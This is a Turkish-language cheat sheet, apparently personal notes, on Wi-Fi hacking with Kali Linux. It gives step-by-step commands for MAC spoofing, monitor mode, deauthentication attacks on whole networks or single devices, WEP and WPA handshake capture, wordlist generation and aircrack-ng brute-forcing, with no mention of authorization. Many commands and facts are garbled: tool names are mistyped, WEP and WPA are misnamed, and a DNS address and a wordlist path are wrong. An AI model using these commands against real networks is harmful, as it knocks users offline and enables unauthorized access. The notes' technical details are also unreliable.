# Cyber Security
- [1-VPN DNS MAC](#1-VPN-DNS-MAC)
  - [VPN Book](#VPN-Book)
  - [Kali DNS Ayarları Değiştirme](#Kali-DNS-Ayarları-Değiştirme)
  - [DNS Sızıntı Testi](#DNS-Sızıntı-Testi)
  - [MAC Adresi Değiştirme](#MAC-Adresi-Değiştirme)
- [2-Monitör Mod ve Manage Mod](#2-Monitör-Mod-ve-Manage-Mod)
- [3-Çevredeki Modemleri Bulma](#3-Çevredeki-Modemleri-Bulma)
- [4-Deauth Saldırısı Yapma](#4-Deauth-Saldırısı-Yapma)
  - [Ağdaki Cihazların MAC Adreslerini Görme](#Ağdaki-Cihazların-MAC-Adreslerini-Görme)
  - [Ağdaki Cihazlara Deauth Saldırısı Yapma](#Ağdaki-Cihazlara-Deauth-Saldırısı-Yapma)
    - [Ağdaki Bütün Cihazlara Saldırı](#Ağdaki-Bütün-Cihazlara-Saldırı)
    - [Ağdaki Belirli Cihaza Saldırı](#Ağdaki-Belirli-Cihaza-Saldırı)
- [5-Wifi Parola Kırma](#5-Wifi-Parola-Kırma)
  - [WEB Parola Kırma](#WEB-Parola-Kırma)
  - [VPA ve VPA2 Parola Kırma](#VPA-ve-VPA2-Parola-Kırma)
    - [Handshake Yakalama](#Handshake-Yakalama)
    - [Wordlist Oluşturma](#Wordlist-Oluşturma)
    - [Parola Kırma](#Parola-Kırma)
- [6-IP ve MAC Adreslerini Eşleme](#IP-ve-MAC-Adreslerini-Eşleme)
  - [Netdiscover](#Netdiscover)
  - [nmap](#nmap)
- [7-Man in the Middle Saldırısı](#7-Man-in-the-Middle-Saldırısı)


# 1-VPN DNS MAC 

VPN (Virtual Personal Network)

DNS (Domain Name Server)

```iwconfig``` -> bağlı olduğumuz wifi ile ilgili bilgileri detaylı olarak gösterir

### VPN Book

```wwww.vpnbook.com``` kali içine VPN indirmemizi sağlar

```openvpn vpnadı``` -> vpn dosyasını açar

```service network-manager restart``` -> internet sunucularını resetler

### Kali DNS Ayarları Değiştirme

```nano /etc/dhcp/dhclient.conf``` içindeki ```prepentt name servers ```değiştirmemiz gerekir

Google DNS-> 8.8.8.8 ya da 8.4.4.8
Cloudflare -> 1.1.1.1. ya da 1.0.0.1

### DNS Sızıntı Testi 

www..dnsleaktest.com

### MAC Adresi Değiştirme

> ### 1.Yöntem

```macchanger```ile mac adresimizi değiştirebiliriz ya da

> ### 2.Yöntem
```
ifconfig wlan0 down

ifconfig wlan hw ether XX:XX:XX:XX:XX:XX  İstediğimiz MAC adresini yapmamızı sağlar

ifconfig wlan0 up
```

# 2-Monitör Mod ve Manage Mod

Wifi adaptörümüzü bilgisayarımıza bağlıyoruz, daha sonra kalimizi monitör moda almamız gerekiyor

> ### 1.Yöntem

```airmon -ng start wlan0```-> interneti monitör moda alır !! Monitör modda iken internete bağlanamayız sadece bağlı olmadığımız ağların bilgilerini elde edebiliriz

```airmon -ng stop wlan0``` -> interneti manage moda alır 

> ### 2.Yöntem
```
ifconfig wlan0 down

ifconfig wlan0 mode monitor

ifconfig wlan0 up
```

# 3-Çevredeki Modemleri Bulma

```airopdump -ng wlan0mon``` -> Çevredeki Modemleri Bulur

```CTRL + X ile işlemi sonlandırırız```

```
* pwr -> - Olarak ne kadar büyükse modem bize o kadar yakındır
* Data -> O ağa kaç cihazın bağlı olduğunu gösterir
* CH -> Hangi kanalda olduğunu gösterir
* ENC -> Şifreleme işlemi bilgisi
```

# 4-Deauth Saldırısı Yapma

### Ağdaki Cihazların MAC Adreslerini Görme
```
airodump -ng --channel X (kanal numarası) --bssid XX:XX:XX:XX:XX:XX (MAC adresi) --write airodumptest (Sonuçları yazdıracağımız 
dosya adı) wlan0
```
### Ağdaki Cihazlara Deauth Saldırısı Yapma

> ### Ağdaki Bütün Cihazlara Saldırı
```
aireplay -ng --deauth A -a XX:XX:XX:XX:XX:XX wlan0mon
```

> ### Ağdaki Belirli Cihaza Saldırı
```
aireplay -ng --deauth A -a XX:XX:XX:XX:XX:XX -c YY:YY:YY:YY:YY:YY wlan0mon
```

```
* A: Gönderilecek paket sayısı, sayı büyüdükçe ağda düşme süresi artar
* -a:  Ağın MAC adresi
* -c:  Saldırı Yapılacak Cihazın MAC adresi
```

# 5-Wifi Parola Kırma 

### WEB Parola Kırma 

Fakeauth saldırısı yapıyoruz ağdan birisi düşüp tekrar bağlanırsa handshake yakalamamız kolaylaşır

```aireplay -ng --fakeauth 0 -a XX:XX:XX:XX:XX:XX -h YY:YY:YY:YY:YY:YY wlan0mon```

```aireplay -ng --arpreplay -b XX:XX:XX:XX:XX:xX -h YY:YY:YY:YY:YY:YY wlan0mon``` belirlenen cihaza IV yollamamızı sağlar

Eğer Ağda Yeteri Kadar Cihaz Yoksa
* fakeauuth yolla
* arpreplay çalıştır
* aircrack -ng çalıştır

```aircrack -ng airodumptest.cap (Tarama Sırasında Yazdırdığımız Dosya)``` 

```192.168.1.1 modeminizin ara yüzüne giriş yaparsınız```

### VPA ve VPA2 Parola Kırma

www.gpuhash.me  -> içine yakalanan handshake'i atarak online olarak şifre kırma işlemi uygulanabilir

> ### Handshake Yakalama

``` airodump -ng --channel X --bssid XX:XX:XX:XX:XX:XX --write handshake-file wlan0mon```

```
channel: Ağın çalıştığı kanal
bssid: Ağın MAC adresi
write: Yakalanan handshake'in nereye kayıt edileceği
```

**! Kolayca handshake yakalamak için ufak paketli deauth saldırı yapılabilir**

> ### Wordlist Oluşturma

``` crunch 6 10 0123456789abcdefgh -o passwrd.txt``` 
içinde "0123456789abcdefgh" geçen min 6 maks 10 haneli şifre kombinasyonlarının olduğu passwrd isimli wordlist oluşturur

```filesystem/usr/shake/wordlist``` içinde en çok kullanılan şifrelerin bulunduğu wordlist

```cat wordlist.txt``` wordlistin içindeki şifreleri görmemizi sağlar

> ### Parola Kırma

``` aircrack -ng handshake-file.cap -w passwrd.txt``` handshake dosyasını ve worlisti kullanarak brute froce saldırısı yapar
# 6-IP ve MAC Adreslerini Eşleme

> ### Netdiscover

```netdiscover -i eth0 -r XX:XX:XX/24 -c 10``` 

* -r: eth0'daki inet'in ilk 6 hanesi
* -c: deneme sayısı

> ### nmap

``` nmap XX:XX.XX.0/24 ```  0 ve 24 yani tüm aralıktaki IPlere istek atar, IP ve MAC adreslerini eşleştirip ekstra bilgi verir. Atılan istekleri
karşı taraf görebilir

# 7-Man in the Middle Saldırısı

